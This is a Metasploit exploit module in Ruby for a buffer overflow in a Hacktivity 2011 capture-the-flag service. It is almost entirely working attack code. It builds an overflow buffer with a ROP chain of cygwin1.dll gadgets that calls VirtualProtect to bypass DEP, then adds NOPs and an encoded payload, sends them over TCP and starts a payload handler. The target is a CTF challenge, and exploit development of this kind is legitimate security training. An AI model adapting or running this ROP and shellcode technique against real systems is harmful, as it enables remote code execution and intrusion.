##
# $Id: $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = NormalRanking

	include Msf::Exploit::Remote::Tcp

	def initialize(info = {})
		super(update_info(info,
			'Name'		=> 'Hacktivity 2011 CtF paradise buffer overflow',
			'Description'	=> %q{
					This module exploits the vulnerability in one of the Hacktivity 2011 
					Capture the Flag challenges. 
			},
			'License'		=> MSF_LICENSE,
			'Author'		=> 
				[
					'mr.schyte',
					'soyer',
					'sghctoma',	
				],
			'Version'		=> '$Revision:$',
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
				},
			'Platform'	=> 'win',
			'Payload'	=>
				{
					'Space' => 700,
				},

			'Targets'		=>
				[
					[ 'Windows 7',
						{
							'Offset'	=>	88,
						}
					],
				],
			'Privileged'	=> false,
			'DisclosureDate'	=> 'September 21 2011',
			'DefaultTarget'	=> 0))

		register_options([Opt::RPORT(1337)], self.class)

	end

	def exploit

		connect

		buffer = "976"
		buffer << "\x7c"
		buffer << rand_text_alpha_upper(target['Offset'])
	
		buffer <<
		[
			0x61006aa4,	# POP EAX # RETN [cygwin1.dll] 
			0x61240000,	# &Readable location [cygwin1.dll]
			0x610d2b05,	# MOV EAX,DWORD PTR DS:[EAX] # RETN [cygwin1.dll] 
			0x6114ea3a,	# XCHG EAX,ESI # RETN [cygwin1.dll] 
			0x61094000,	# POP EBP # RETN [cygwin1.dll] 
			0x610b79a5,	# & push esp #  ret  [cygwin1.dll]
			0x61043c03,	# POP EBX # RETN [cygwin1.dll] 
			0x00000201,	# 0x00000201-> ebx (dwSize)
			0x6104a0d8,	# POP EDX # XOR ECX,ECX # ADD ESP,20 # MOV EAX,ECX # POP EBX # POP ESI # POP EDI # RETN [cygwin1.dll] 
			0x00000040,	# 0x00000040-> edx
			0x41414141,	# Filler (compensate)
			0x41414142,	# Filler (compensate)
			0x41414143,	# Filler (compensate)
			0x41414144,	# Filler (compensate)
			0x41414145,	# Filler (compensate)
			0x41414146,	# Filler (compensate)
			0x41414147,	# Filler (compensate)
			0x41414148,	# Filler (compensate)
			0x00001000,	# 0x00001000 -> ebx ()
			0x61159ef0,	# ptr to &VirtualProtect() [IAT cygwin1.dll]
			0x4141414b,	# Filler (compensate)
			0x61006aa4,	# POP EAX # RETN [cygwin1.dll] 
			0x61240000,	# &Writable location [cygwin1.dll]
			0x61096f7b,	# XCHG EAX,ECX # RETN [cygwin1.dll] 
			0x6104f400,	# POP EDI # RETN [cygwin1.dll] 
			0x6103ac02,	# RETN (ROP NOP) [cygwin1.dll]
			0x61006aa4,	# POP EAX # RETN [cygwin1.dll] 
			0x90909090,	# nop
			0x61018938,	# PUSHAD # RETN [cygwin1.dll] 
		# rop chain generated with mona.py
		].pack("V*")

		buffer << make_nops(50)
		buffer << payload.encoded
		
		print_status("Trying target #{target.name}...")
		sock.put(buffer)

		handler
		disconnect

	end
end
